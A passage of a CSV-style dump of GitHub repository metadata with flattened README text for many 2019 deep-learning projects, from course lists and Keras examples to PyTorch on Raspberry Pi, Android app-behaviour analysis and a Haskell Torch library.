CS236605 https vistalab technion github io cs236605 lectures YouTube Lectures https www youtube com playlist list PLM0a6Z788YAaWCyV q9NrGm5qQegZR5 S2019 41 Introduction to Deep Learning Bhiksha Raj and many others CMU 11 785 http www cs cmu edu bhiksha courses deeplearning Spring 2019 www YouTube Lectures https www youtube com playlist list PLp 0K3kfddPzNdZPX4p0lVi6AcDXBofuf S2019 42 Introduction to Deep Learning Bhiksha Raj and many others CMU 11 785 https www cs cmu edu bhiksha courses deeplearning Fall 2019 www YouTube Lectures https www youtube com playlist list PLp 0K3kfddPwz13VqV1PaMXF6V6dYdEsj Recitations https www youtube com playlist list PLp 0K3kfddPxf4T59JEQKv5UanLPVsxzz F2019 43 UvA Deep Learning Efstratios Gavves University of Amsterdam UvA DLC https uvadlc github io Lecture Videos https uvadlc github io lectures 2019 Go to Contents arrowheadingup https github com kmario23 deep learning drizzle contents heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussign heavyminussig,2019-10-19T13:29:50Z,2019-12-11T02:16:04Z,n/a,jiajunhua,User,3,2,0,104,master,kmario23#Eurus-Holmes#ankitshah009#ieee8023#ngocdha,5,0,0,0,0,0,0
Lornatang,Deep-learning-with-python3,n/a,Deep Learning with Python Reference Franois Chollet https github com fchollet These code use Python 3 7 and Keras 2 1 8 Table of contents Chapter 2 2 1 A first look at a neural network https github com lornatang deep leraning with python3 blob master 2 1 a first look at a neural network py Chapter 3 3 5 Classifying movie reviews https github com lornatang deep leraning with python3 blob master 3 5 classifying movie reviews py 3 6 Classifying newswires https github com lornatang deep leraning with python3 blob master 3 6 classifying newswires py 3 7 Predicting house prices https github com lornatang deep leraning with python3 blob master 3 7 predicting house prices py Chapter 4 4 4 Underfitting and overfitting https github com lornatang deep leraning with python3 blob master 4 4 overfitting and underfitting py Chapter 5 5 1 Introduction to convnets https github com lornatang deep leraning with python3 blob master 5 1 introduction to convnets py 5 2 Using convnets with small datasets https github com lornatang deep leraning with python3 blob master 5 2 using convnets with small datasets py 5 3 Using a pre trained convnet https github com lornatang deep leraning with python3 blob master 5 3 using a pretrained convnet py 5 4 Visualizing what convnets learn https github com lornatang deep leraning with python3 blob master 5 4 visualizing what convnets learn py Chapter 6 6 1 One hot encoding of words or characters https github com lornatang deep leraning with python3 blob master 6 1 one hot encoding of words or characters py 6 1 Using word embeddings https github com lornatang deep leraning with python3 blob master 6 1 using word embeddings py 6 2 Understanding RNNs https github com lornatang deep leraning with python3 blob master 6 2 understanding recurrent neural networks py 6 3 Advanced usage of RNNs https github com lornatang deep leraning with python3 blob master 6 3 advanced usage of recurrent neural networks py 6 4 Sequence processing with convnets https github com lornatang deep leraning with python3 blob master 6 4 sequence processing with convnets py Chapter 8 8 1 Text generation with LSTM https github com lornatang deep leraning with python3 blob master 8 1 text generation with lstm py 8 2 Deep dream https github com lornatang deep leraning with python3 blob master 8 2 deep dream py 8 3 Neural style transfer https github com lornatang deep leraning with python3 blob master 8 3 neural style transfer py 8 4 Generating images with VAEs https github com lornatang deep leraning with python3 blob master 8 4 generating images with vaes py 8 5 Introduction to GANs https github com lornatang deep leraning with python3 blob master 8 5 introduction to gans py,2019-10-26T03:58:31Z,2019-11-20T08:55:12Z,Python,Lornatang,User,1,2,1,8,master,Lornatang,1,0,0,0,0,0,0
skzhang-eng,Deep-learning-on-Raspberry-Pi,n/a,Update pytorch version 1 1 0 torchvision version 0 3 0 and pysyft version 0 1 29a1 will work better than old version some update to date code may encounter errors whiles running in Pytorch 1 0 0 with torchvision 0 2 2 post3 and PySyft 0 1 10a4 Installation of Pytorch 1 1 0 and PySyft 0 1 29a1 This tutorial is written for Arm v7l under python version 3 7 3 pytorch version 1 1 0 torchvision version 0 3 0 pysyft version 0 1 29a1 First let s run this command in terminal sudo pip3 install upgrade pip sudo pip3 install pyserial Now install some dependencies for pytorch sudo apt update sudo apt install libopenblas dev libblas dev m4 cmake cython3 python3 dev python3 yaml python3 setuptools Download the binary files the pytorch binary file is compiled by myself on a raspberry pi 3 B the operating system is Raspbian and gcc verion 8 3 0 g version 8 3 0 The pre compiled torchvision 0 3 0 binary file can be found here https github com marcusvlc pytorch on rpi Enter the folder where the downloaded binary files are Then run the following command sudo pip3 install torch 1 1 0 whl sudo pip3 install torchvision whl sudo pip3 install pysyft 0 1 29a1 If you were told Cannot uninstall PaYAML It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall try this way sudo pip3 install ignored installed PyYAML Now we can import torch and syft under python3 terminal is good jupyter nooebook is another great choice sudo pip3 install jupyter notebook If there are warnings related to tensorflow while doing import syft since we are using pytorch please kindly ignore the warnings Now we are all set Federated Learning on Raspberry Pi Setting up After trying several times I choose to use Pytorch 1 0 0 and PySyft 0 1 10a4 all the installation steps are the same to what is described above except several specific steps The Pytorch 1 0 0 binary file can be found here https github com shashigharti federated learning on raspberry pi blob master PyTorch 20Wheels torch 1 0 0a0 2B8322165 cp37 cp37m linuxarmv7l whl Another thing is we can use following command to install torchvision instead of installing it using binary file sudo pip3 install torchvision 0 2 2 post3 Similarly installing PySyft by this sudo pip3 install syft 0 1 10a4 Now we have finished setting up development environment abou how to perform federated learning on Raspberry Pi please follow this tutorial https medium com secure and private ai writing challenge federated learning of a recurrent neural network for text classification with raspberry pis 6ce184f85a2a Reference https blog openmined org federated learning of a rnn on raspberry pis https medium com secure and private ai writing challenge a step by step guide to installing pytorch in raspberry pi a1491bb80531 https medium com secure and private ai writing challenge a step by step guide to installing pysyft in raspberry pi d8d10c440c37 https github com marcusvlc pytorch on rpi https wormtooth com 20180617 pytorch on raspberrypi https github com shashigharti federated learning on raspberry pi blob master PyTorch 20Wheels torch 1 0 0a0 2B8322165 cp37 cp37m linuxarmv7l whl https medium com secure and private ai writing challenge federated learning of a recurrent neural network for text classification with raspberry pis 6ce184f85a2a,2019-10-13T14:45:19Z,2019-11-12T22:02:26Z,n/a,skzhang-eng,User,1,2,0,45,master,skzhang-eng,1,0,0,0,0,0,0
indranildchandra,Deep-Learning-on-the-Edge,n/a,Deep Learning on the Edge DL on the Edge is a repository for keeping all the object detection demos for my talk at Google Developers Group GDG Mumbai and Bangalore 2019 Accessible and affordable compute power volume and variety of data better algorithms and frameworks are the 3 major reasons why Deep Learning as a field has exploded and has become so popular in the last decade This talk was primarily focused on the first aspect compute power and how modern DL based solutions can be deployed on edge devices with minimal compute power Solutions like NUC Next Unit of Computing and NCS2 Neural Compute Stick 2 were discussed and how they can be leveraged to build solutions like auto navigating robots and assistive devices with accompanying demos How to Links 1 Setup OpenVINO Toolkit https docs openvinotoolkit org 2019R2 index html 2 Setup NCS2 https software intel com en us articles get started with neural compute stick 3 Setup Intel Realsense D435i Depth Camera https www intelrealsense com videos and tutorials Links to other repositories containing other demos used in the talk https github com indranildchandra Intel Realsense SLAM Robotics https github com laukik hase rsslamws Other Demo Videos Intel Realsense D435i Depth Camera Basic Mapping Demo https www youtube com watch v KcBZrFVRxlI Intel Realsense D435i Depth Camera IMU Pitch Roll Demo https www youtube com watch v qOyn O5LZNQ Intel Realsense D435i Depth Camera Mapping Localization Demo https www youtube com watch v 0LK3DQey9I Autonomous Quadruped Robot Demo https www youtube com watch v NFO0sFC34yE,2019-09-21T11:03:00Z,2019-10-09T05:14:34Z,Python,indranildchandra,User,1,2,0,4,master,indranildchandra,1,0,0,0,0,0,0
decotoj,Deep-Learning-Space-Observation-Association,n/a,Deep Learning Space Observation Association Space Observation Association is the problem of determining which if any angles only observations from a group of untagged observations are of the same resident space object RSO Angles only observations refers to optical tracks derived from ground or space based telescropes observing the space environment A typical observation consists of the following pieces of information an epoch observer position unit vector to the observed object and rate of change of the observation unit vector This projects explores methods of solving this problem that do not rely on expert system approaches Rather than rely on expert humans to code rulesets this projects attempts to learn from the data itself Luckily this is a problem for which realistic data can be readily synthesized The file synthesizedata py can be run to produce simulated tracking data for which the true correlations are known i e labelled training data sythesizedata py produces three separate sets of two files a train validation and test set Each set consists of Data CSV File Each row is an observation with the following 10 parameters for each observation All parameters are reported in an Earth Centered Inertial ECI coordinate frame A simple two body propagator is used to simulate the observations thank you to Shushi Uetsuki whiskie14142 time seconds observer pos x km observer pos y km observer pos z km observation unit vector x observation unit vector y observation unit vector z observation unit vector rate of change x 1 seconds observation unit vector rate of change y 1 seconds observation unit vector rate of change z 1 seconds Tags CSV File Contains the true RSO id numbers for the observed RSOs in the observations in the Data CSV File mainnnassoc8 py performs training of a multi layered fully connected neural network to identify triplets of observation as either all of the same RSO or of one or more RSOs The resulting network can be used to identify triplets of observation most likely to be of the same RSO from a large pool of uncorrelated observations Such identifcation can then lead to more accurate orbit fits to the unknown object than would have been possible with single track data alone The resulting orbit can then be used for sensor re tasking and ultimately regular observation and custody of the unknown object Data Visualization Two dimensional display of observations of four different RSOs over a multi hour period Observation association is the task of associating which observations are of the same RSO w no apriori tagging or other information GitHub Logo resources dataexample2D png Format Alt Text url Three dimensional display of several observations Observer positions are on surface of earth Each observation is a unit vector originating at the location of the observer and in the direction of the observed object GitHub Logo resources dataexample3D png Format Alt Text url,2019-10-17T16:52:00Z,2019-12-03T13:06:30Z,Python,decotoj,User,2,2,0,35,master,decotoj,1,0,0,0,0,0,0
VivekDosaya,MachineAndDeepLearningAlgorithms,n/a,,2019-10-25T23:58:36Z,2019-10-26T14:01:07Z,Python,VivekDosaya,User,1,2,0,0,master,,0,0,0,0,0,0,0
Abhishek786singh,WALMART_STORE_SALES_PREDICATION,n/a,,2019-10-02T14:08:32Z,2019-10-10T13:51:11Z,Jupyter Notebook,Abhishek786singh,User,1,2,0,7,master,Abhishek786singh,1,0,0,0,0,0,0
deepintent-ccs,DeepIntent,n/a,DeepIntent Implementation of the paper DeepIntent Deep Icon Behavior Learning for Detecting Intention Behavior Discrepancy in Mobile Apps Introduction In this work we focus on detecting the intention behavior discrepancies of interactive UI widgets in Android apps which express their intentions via texts or images and respond to users interactions e g clicking a button Specifically we focus on the interactive UI widgets that use icons to indicate their expected behaviors referred to as icon widgets since icon widgets are prevalent in apps and many of them access sensitive information We propose to build a novel framework DeepIntent that learns an icon behavior model from a large number of apps and uses the model to detect undesired behaviors The design of DeepIntent is based on three key insights First mobile apps UIs are expected to be evident to users and icons indicating the same type of sensitive behavior should have similar looks Second in different UI contexts icons may reflect different intentions Third users expect certain behaviors when interacting with icon widgets that have specific looks and undesired behaviors usually contradict users expectations To capture such general expectation we propose to develop program analysis techniques that can associate icons to their sensitive behaviors and apply the techniques to extract the associations from a corpus of popular apps to learn models on expected behaviors for icon widgets with specific looks Such model can then be used to detect abnormal behaviors as intention behavior discrepancies In particular we use permission uses to summarize icon widgets sensitive behaviors i e sensitive APIs invoked since undesired behaviors need to request permissions to access sensitive information Based on these key insights DeepIntent provides a novel learning approach deep icon behavior learning which consists of three major phases Icon Widget Analysis Learning Icon Behavior Model and Detecting Intention Behavior Discrepancies Overview of Workflow of DeepIntent overview jpg We collect a set of 9 891 benign apps and 16 262 malicious apps from which we extract over 10 000 icon widgets that are mapped to sensitive permission uses We use 80 of the icons from the benign apps as training data and detect the intention behavior discrepancies on the remaining icons from the benign apps and all the icons from malicious apps For the test set we manually label whether there is an intention behavior discrepancy to form the ground truth Finally DeepIntent returns a ranked list based on the outlier scores for detecting intention behavior discrepancies Requirements Android SDK Version 18 PScout Version jellybean JAVA Version 1 8 0181 Repository Contents The program analysis is in DeepIntent IconWidgetAnalysis StaticAnalysis directory It contains icon widget association analysis i e GATOR IconIntent icon behavior association analysis i e ic3 APKCallGraph and icon permisssion mapping Usage DeepIntent contains two three major components The first step is to run static analysis on Android apps obtain the association results of UI widgets and icons from xml files their handlers and API calls in the source code and corresponding permission uses Detailed instruction is shown in IconWidgetAnalysis Citing If you find DeepIntent useful in your research we require you to cite the following paper inproceedings title DeepIntent Deep Icon Behavior Learning for Detecting Intention Behavior Discrepancy in Mobile Apps author Shengqu Xi Shao Yang Xusheng Xiao Yuan Yao Yayuan Xiong Fengyuan Xu Haoyu Wang Peng Gao Zhuotao Liu Feng Xu Jian Lu booktitle 2019 ACM SIGSAC Conference on Computer and Communications Security CCS 19 November 11 15 2019 London United Kingdom year 2019,2019-09-20T04:46:29Z,2019-11-26T02:45:33Z,Java,deepintent-ccs,User,3,2,0,99,master,ShaoYang1992#cellzero,2,0,0,0,0,0,0
ravishchawla,Reinforcement-Learning-NanoDegree,n/a,Udacity Deep Reinforcement Learning Repository This Repository contains code for the Udacity Deep Reinforcement Learning Project 1 Project 1 Navigation https github com ravishchawla Reinforcement Learning Navigation tree master Project 201 20 20Navigation 2 Project 2 Continous Control https github com ravishchawla Reinforcement Learning Navigation tree master Project 202 20 20Continous 20Control 3 Project 3 Collaboration and Competition https github com ravishchawla Reinforcement Learning NanoDegree tree master Project 203 20 20Collaboration 20and 20Competition Licensing Authors Acknowledgements Work by Ravish Chawla http medium com ml2vec Credit to Udacity for providing the data and environment You can find the Licensing for the data and other descriptive information from Udacity https www udacity om This code is free to use,2019-09-27T14:53:52Z,2019-12-07T08:19:08Z,Python,ravishchawla,User,1,2,0,9,master,ravishchawla,1,0,0,2,0,2,1
curiousily,Deploy-Keras-Deep-Learning-Model-with-Flask,airbnb#deep-learning#google-appengine#jupyter-notebook#keras#machine-learning#neural-network#price-prediction#python#regression#rest-api#scikit-learn#tensorflow,Zero to Production It is not recommended to deploy your production models as shown here This is just an end to end example to get started quickly Read the complete guide https www curiousily com posts deploy keras deep learning project to production with flask This guide shows you how to build a Deep Neural Network that predicts Airbnb prices in NYC using scikit learn and Keras build a REST API that predicts prices based on the model using Flask and gunicorn deploy the model to production on Google App Engine Quick start Requirements Python 3 7 Google Cloud Engine account Google Cloud SDK https cloud google com sdk install Clone this repository bash git clone git github com curiousily End to End Machine Learning with Keras git cd End to End Machine Learning with Keras Install libraries bash pip install r requirements txt Start local server bash flask run Make predictions bash curl d neighbourhoodgroup Brooklyn latitude 40 64749 longitude 73 97237 roomtype Private room minimumnights 1 numberofreviews 9 calculatedhostlistingscount 6 availability365 365 H Content Type application json X POST http localhost 5000 Deploy to Google App Engine bash gcloud app deploy Read the complete guide https www curiousily com posts deploy keras deep learning project to production with flask,2019-10-21T15:18:24Z,2019-10-27T21:21:37Z,Jupyter Notebook,curiousily,User,2,2,1,14,master,curiousily,1,0,0,0,0,0,0
ADI-tya-P,Solving-Sudoku-using-Deep-Q-learning,deep-learning#dqn#dqn-tensorflow#reinforcement-learning#sudoku-environment#sudoku-solver#tensorflow,Solving Sudoku using Deep Q learning https github com ADItyaP999 Solving Sudoku using Deep Q learning blob master images DQN 20 20Sudoku 20Solver png This project is about solving Sudoku using Deep Q Learning The Input layer consist of Current State Action being performed in Current State Reward which has been got for doing the Action Future State after performing the Action In middle I used a 2 Hidden Layers of 20 Neurons each In Output Layer the has group of actions that are needed to solve Sudoku Move Action Those are Left Right Up Down Inserting Number Insert Numbers from 1 to 9 Replay Memory To Train the Neural Network the Model needs to have a proper data points And the points I used were Current State Action Reward Future State Initially 200 data points were stored and the Action decision for each 200 states was taken by Evaluation Net After 200 data points I used DQN Model i e Target Value and Evaluated Value for making proper predictions for further Environments How to run Click Here to Downlaod the Dataset https www kaggle com bryanpark sudoku To install required packages pip install r requirements txt Run the root py file to start training Run in Terminal ONLY python root py,2019-09-23T15:16:50Z,2019-11-11T07:50:33Z,Python,ADI-tya-P,User,2,2,0,10,master,ADI-tya-P,1,0,0,1,0,1,0
Liut2016,AwesomeDeepLearningGuidance-TimeSeriesData,n/a,DrCubic pic DrCubic1 png build https img shields io badge build passing brightgreen python https img shields io badge python v3 5 2 blue pytorch https img shields io badge pytorch v1 1 0 blue GitHub followers https img shields io github followers Liut2016 label Follow style social Modeling Long and Short Term Temporal Patterns with Deep Neural Networks https arxiv org abs 1703 07015 laiguokun LSTNet https github com laiguokun LSTNet laiguokun multivariate time series data https github com laiguokun multivariate time series data pytorch https pytorch apachecn org docs 1 2 1 data save https github com laiguokun multivariate time series data 4data angular2html checkpoint pt data electricity txt exchangerate txt solarAL txt traffic txt ele sh main py models attention py bak init py LSTM py RNN py baseModel py CNN py GRUattention py init py LSTNet py MultiHeadAttention py Optim py pic configuration png DrCubic1 png DrCubic png README md save solar sh stock sh tools earlystopping py init py traffic sh traffic sh bak utils py 2 PyCharmRun Edit Configurations configuration pic configuration png traffic sh ele sh angular2html traffic sh 1 modelspyModel 2 main py8 rse rae corr LSTNet 0 5076 0 3404 0 8591 RNN base 0 5549 0 4063 0 8342 LSTM base 0 5403 0 3736 0 8444 GRU base 0 5357 0 3689 0 8493 GRU bidirectional 0 5761 0 3929 0 8265 GRU without outputfun 0 5610 0 4076 0 8307 GRU add earlystopping 0 5367 0 3753 0 8460 GRU attention 0 5359 0 3716 0 8472 GRU numlayers 2 0 5285 0 3521 0 8531 GRU numlayers 3 0 5280 0 3536 0 8531 GRU numlayers 4 0 5241 0 3500 0 8561 GRU numlayers 10 0 5893 0 4175 0 8164 CNN 0 5685 0 4176 0 8223 1 earlystoping GRU90Epoch60Epochlossearlystoping 2 3 lossoutput scale 4 causal convolutional,2019-10-30T15:32:32Z,2019-11-19T03:32:19Z,Python,Liut2016,User,3,2,0,4,master,Liut2016#laiguokun,2,0,0,0,1,0,0
ferhatakar,Udacity-Classifying-Urban-sounds-using-Deep-Learning,n/a,,2019-10-29T10:02:33Z,2019-11-01T07:27:19Z,HTML,ferhatakar,User,1,2,0,1,master,ferhatakar,1,0,0,0,0,0,0
mingweihe,pytorch-practice,n/a,pytorch practice practices of Deep learning framework PyTorch,2019-10-29T03:58:28Z,2019-11-14T10:08:59Z,Python,mingweihe,User,0,2,0,16,master,mingweihe,1,0,0,0,0,0,0
PacktPublishing,advanced-deep-learning-for-computer-vision,n/a,,2019-10-25T12:42:39Z,2019-12-14T02:48:15Z,Jupyter Notebook,PacktPublishing,Organization,3,2,0,11,master,vverdhan,1,0,0,0,0,0,0
Tauranis,deep_coffee,n/a,DEEP COFFEE Deep Learning for coffee beans selection Build Status https travis ci com Tauranis deepcoffee svg branch master https travis ci com Tauranis deepcoffee Install docker Follow these steps https docs docker com install linux docker ce ubuntu Install nvidia container toolkit or nvidia docker2 Follow these steps https github com NVIDIA nvidia docker Install The command below will download the dataset build the docker image and run the data preprocessing steps data augmentation and create tfrecords make install Build docker image This is already performed if you previously have run make install docker build t deepcoffee Test if image was build correctly docker run rm gpus all deepcoffee nvidia smi Playground enter inside container docker run it v PWD deepcoffee src deepcoffee v PWD test src test v PWD dataset dataset v PWD trainedmodels trainedmodels v PWD keraspretrainedmodels root keras models rm gpus all deepcoffee bash Run unit tests docker run rm gpus all deepcoffee python m unittest discover s app test imageproc Crop beans This is already performed if you previously have run make install docker run v PWD dataset dataset rm gpus all deepcoffee python m deepcoffee imageproc cropbeans rawimagesdir dataset raw outputdir dataset cropped Data Augmentation This is already performed if you previously have run make install Up to this day only rotation is implemented TODO Saturation Brightness Noise GANs Rotate beans Good beans docker run v PWD dataset dataset rm gpus all deepcoffee python m deepcoffee imageproc dataaug inputdir dataset good outputdir dataset good anglelist 45 90 135 180 225 270 Bad beans docker run v PWD dataset dataset rm gpus all deepcoffee python m deepcoffee imageproc dataaug inputdir dataset bad outputdir dataset bad anglelist 45 90 135 180 225 270 Generate TFRecords This is already performed if you previously have run make install docker run v PWD dataset dataset rm gpus all deepcoffee python m deepcoffee ml imagestotfrecords outputdir dataset tfrecords tftartifactsdir dataset tftartifacts goodbeansdir dataset good goodbeanslisttrain dataset protocol goodtrain txt goodbeanslisteval dataset protocol goodeval txt goodbeanslisttest dataset protocol goodtest txt badbeansdir dataset bad badbeanslisttrain dataset protocol badtrain txt badbeanslisteval dataset protocol badeval txt badbeanslisttest dataset protocol badtest txt imagedim 224 nshards 10 ext jpg temp dir tmp Decode dataset from tfrecords to images just for testing docker run v PWD dataset dataset v PWD trainedmodels trainedmodels v PWD deepcoffee src deepcoffee v PWD keraspretrainedmodels root keras models rm gpus all deepcoffee python m deepcoffee ml decodetfrecorddataset tfrecordfile dataset tfrecords train outputdir dataset decodedtfrecords tftartifactsdir dataset tftartifacts Train network BEWARE when training ResNet or VGG locally on your laptop you re likely to get OOM Choose the batch size wisely export KERASHOME trainedmodels docker run v PWD dataset dataset v PWD trainedmodels trainedmodels v PWD deepcoffee src deepcoffee v PWD keraspretrainedmodels root keras models rm gpus all deepcoffee python m deepcoffee ml trainandevaluate outputdir trainedmodels tftartifactsdir dataset tftartifacts inputdim 224 trainsetlen 1265 evalsetlen 264 testsetlen 278 configfile app deepcoffee ml config mobilenet yml learningrate 0 0001 batchsize 8,2019-10-24T10:31:34Z,2019-12-04T15:44:01Z,Python,Tauranis,User,2,2,0,40,master,Tauranis#rodrigofp-cit,2,0,0,0,0,0,0
ximingxing,Learning-To-Learn,pytorch,Leaning To Learn,2019-10-15T07:46:39Z,2019-12-08T07:48:16Z,Python,ximingxing,User,1,2,0,22,master,ximingxing,1,0,0,0,0,0,1
yzzhang,machine-learning-spark,n/a,Publications on Data Science 1 Deep Learning 1 1 Deep Learning in Winonsin Breast Cancer Diagnosis See publication A deep learning approach for healthcare Towards Data Science Oct 30 2019 https towardsdatascience com deep learning in winonsin breast cancer diagnosis 6bab13838abd 1 2 Deep Learning for Natural Language Processing Using word2vec keras See publication A deep learning approach for NLP by combining Word2Vec with Keras LSTM Towards Data Science Nov 3 2019 https towardsdatascience com deep learning for natural language processing using word2vec keras d9a240c7bb9d 2 Machine Learning 2 1 Python Data Preprocessing Using Pandas DataFrame Spark DataFrame and Koalas DataFrame See publication Preparing data for machine learning in Python Towards Data Science Oct 14 2019 https towardsdatascience com python data preprocessing using pandas dataframe spark dataframe and koalas dataframe e44c42258a8f 2 2 Object Oriented Machine Learning Pipeline with mlflow for Pandas and Koalas DataFrames See publication End to end process of developing Spark enabled machine learning pipeline in Python using Pandas Koalas scikit learn and mlflow Towards Data Science Oct 24 2019 https towardsdatascience com object oriented machine learning pipeline with mlflow for pandas and koalas dataframes ef8517d39a12 2 3 Automatic Machine Learning in Fraud Detection Using H2O AutoML See publication Machine Learning Automation in Finance Towards Data Science Nov 13 2019 https towardsdatascience com automatic machine learning in fraud detection using h2o automl 6ba5cbf5c79b Certificates Udacity Machine Learning Engineer Nanodegree https github com yzzhang machine learning blob master certificates Yuefengcertificate11282017 pdf AWS Certified Solutions Architect Associate https github com yzzhang machine learning blob master certificates AWSCertifiedSolutionsArchitectAssociatecertificate pdf AWS Certified Developer Associate https github com yzzhang machine learning blob master certificates AWSCertifiedDeveloperAssociateCertificate pdf,2019-10-21T03:59:27Z,2019-11-14T18:08:55Z,Jupyter Notebook,yzzhang,User,1,2,0,1,master,yzzhang,1,0,0,0,0,0,0
abhisheknaiidu,Food_Classification,n/a,Food Lens Its basically a Food Classifier for multiclass classification which can detect around 500 classes of food and their subclasses It also provides information regarding calories for that particular food item and their sub class items Screenshot intern png,2019-09-21T06:12:34Z,2019-10-24T04:57:18Z,Jupyter Notebook,abhisheknaiidu,User,2,2,1,8,master,abhisheknaiidu,1,0,0,0,0,0,0
Lego1st,pytorch-starter-kit,n/a,pytorch dl starter Starter Kit for Deep Learning projects Example case Cifar 10 With initial data directory structure bash cifar train idxclass png test idxclass png labels txt Project structure config py default config for project datasets py EDA ipynb expconfigs config for each experiment exp0 yaml InferAndTest ipynb logs exp0fold0 test log exp0fold0 train log exp0fold0 valid log lrscheduler py main py models init py resnet py custom model for project utilsmodule py utilizations for model outputs output files such as prediction for test inference validation testexp0fold0 npy README md utils py weights bestexp0fold0 pth exp0fold0 pth Examples Train python main py config expconfigs exp0 yaml Valid Test python main py config expconfigs exp0 yaml load weights bestexp0fold0 pth valid python main py config expconfigs exp0 yaml load weights bestexp0fold0 pth test tta test with tta mode Requirements yacs apex pretrainedmodels torch torchvision pandas albumentations pytorchtoolbelt,2019-09-20T05:13:28Z,2019-11-26T10:15:52Z,Python,Lego1st,User,0,2,1,4,master,Lego1st,1,0,0,0,0,0,0
goldblum,TruthOrBackpropaganda,n/a,Truth or backpropaganda An empirical investigation of deep learning theory https openreview net forum id HyxyIgHFvr Micah Goldblum Jonas Geiping Avi Schwarzschild Michael Moeller Tom Goldstein This repository consists of code developed in order to empirically investigate assertions from deep learning theory The associated paper can be found here https arxiv org abs 1910 00359 Specifically experiments in this repository examine local minima of the loss surface weight decay neural tangent kernels and the rank of operators in networks The directories in this repository are separated by topic,2019-09-29T20:09:28Z,2019-10-21T19:10:40Z,Python,goldblum,User,2,2,0,10,master,goldblum#aks2203,2,0,0,0,0,0,0
abarbu,haskell-torch,n/a,Haskell Torch Logo https github com abarbu haskell torch blob master logo with text png Build Status https img shields io circleci project github abarbu haskell torch svg https circleci com gh abarbu haskell torch Haskell Torch If you ve manged to find this package you should ignore it for now We ll have an official release in a week or two Practical deep learning in Haskell built on the same C foundations as PyTorch Same speed more safety comprehensive lots of pretrained models and it works today Check out examples of how to build typesafe CNNs like AlexNet and ResNet and language models based on stacked LSTMs along with GANs and VAEs You ll see how to efficiently stream data to them from datasets like MNIST load pretrained models from PyTorch transfer weights back to PyTorch use Tensorboard and everything else you need to write deep learning code in Haskell https github com abarbu haskell torch tree master haskell torch src Torch Tutorial Why Writing deep learning code is too error prone We spend a lot of our time debugging subtle issues and fearing big refactors That s exactly what Haskell is good at Contributors This library is built on top of all of the hard work of the PyTorch community Haskell Torch was developed by Andrei Barbu https 0xab com Andrei is a research scientist at MIT working on understanding flexible human intelligence how children learn language how robots can understand language how language enables us to perform new tasks and how language is represented in the human brain Installation You will first need Conda a Python package manager It s a simple install https www anaconda com distribution download section Then run setup sh We strongly suggest adding this to your bashrc file export OMPNUMTHREADS 1 OpenMP seems to have terrible heuristics around how many threads it should create causing constant issues You may see strange problems on larger machines without setting this Of course you may want to set it to some number larger than 1 These problems can also occur in Haskell and the slowdowns on larger machines can be terrible on a 50 core machine we see a nearly 40x slowdown compared to single core performance without this flag After running setup sh you can now build just remember to also activate the environment We ve already built for you the first time conda activate haskell torch stack build haskell torch fast If you are using Jupyter build it and start it conda activate haskell torch stack install ihaskell fast stack exec ihaskell install stack stack exec jupyter notebook Only the last command is needed in the future Since building takes some time and the Haskell code is not the dominant part of the runtime feel free to use fast If you have a CUDA capable setup it will be automatically recognized and CUDA support will be enabled If you change anything about CUDA support you will want to rerun setup sh Note that code that requires CUDA will not typecheck unless you install a cuda capable version If you are starting an IDE that has to talk to GHC make sure to start that IDE from a shell where you have activated the haskell torch environment in conda To run ghci from the commandline stack ghci no load haskell torch Then load Torch and test things out with ones TFloat KCpu 3 1 out You should see a vector printed to your terminal Have fun FAQ How do I get started Read and run the example tutorial code The library is large the types are complex and the type errors can be really scary That s why we have a comprehensive set of examples You will find these in haskell torch src Torch Tutorial Intro Read through the tutorial and follow along with it Then reproduce some of the networks in the tutorial yourself That will give you a feel for how building up networks incrementally works in terms of how the types align when things are too ambiguous etc Don t forget to use tensorboard There s an example for that too Running stack ghci results in a slew of errors what do I do That s normal and in any case running ghci the standard way will load many modules on startup making it load times very painful Instead skip all of this and tell ghci to load only the haskell torch package stack ghci no load haskell torch Then load Torch Now you re good to go I get ambiguous type errors what should I do These are actually extremely common all over Haskell in particular for numeric code They re hidden by a defaulting mechanism but this isn t exposed to users So we can t pick defaults the way that the builtin libraries can It would be nice if type checker plugins had access to defaults but that s not the situation today We have several pure functions that let you deal with this In particular the Tensor module has typed sized stored like onCpu onCuda None of these have any effect at runtime They constrain the types of their inputs in particular ways For example typed TFloat x ensures that x is a float sized 2 3 x ensures that the tensor is 2 by 3 like x y returns y ensuring that its type is like x You may also find that errors come from GHC not running the constraint solver enough because the default limit is very low GHC will tell you this is the case you don t need to guess but you may want to increase the maximum number of iterations with set fconstraint solver iterations 50 in GHC or with OPTIONSGHC fconstraint solver iterations 50 in your code How do I get started writing models Once you work through the tutorials you ll want to write your own models Don t just jump into this Reproduce one of the larger models in the examples from scratch by yourself step by step This will give you a feel for how building networks works without having to worry about the parameters of the network GHC is rather brittle today when it comes to the complex code in this library so you ll want to follow a certain pattern when making new models Otherwise you ll end up with pages of crazy type errors Start by defining the type of your model like forward DataPurpose Tensor TFloat KCpu 100 3 32 32 IO Tensor TFloat KCpu 100 10 You almost always want to take the DataPurpose as input this tells you if the data is training data or test data some layers behave differently at test and training time The first parameter will contain the parameters and we clearly defined our input and output I like to make even the batch size 100 above and the device KCpu concrete when developing the network and then relax them later KCuda being another popular option Write the code piping layers with and end it with a hole like to see what the current output is vs the desired output Make the first argument of forward an n tuple with the different weights parameters Haskell will infer the type of that n tuple and eventually you can put it into a data declaration and call it whatever you want In the final code you will usually see at least one record that holds the parameters of the network It s type is just derived by copying and pasting the type of the tuple that was being fed into the model wrapping it in a record and then using the RecordWildCards extension to replace the tuple That s post hoc I don t find it a good strategy for development It also fossilizes your network because the types of the inputs fix the types in the intermediate layers Changing your network becomes very painful because you need to change both the record and the parameters of the layers in sync I undo this record and switch back to an n tuple or I parameterize the record by an additional n tuple that holds other parameters until they can be moved into the record Once we remove that there is little redundancy making network changes very quick and easy Note that we aren t jumping in the middle of a network and building out And we aren t making our network polymorphic from the get go That s a recipe for disaster today you want to start with concrete types Inference is too brittle errors are too messy defaulting is a mess leading to ambiguity errors and the layers are too polymorphic for this to be practical right now It will get better with time If you want to port a model from PyTorch you should print it This is far better than looking at the tensorboard graph but note that some layers don t appear in the printout It s good to both 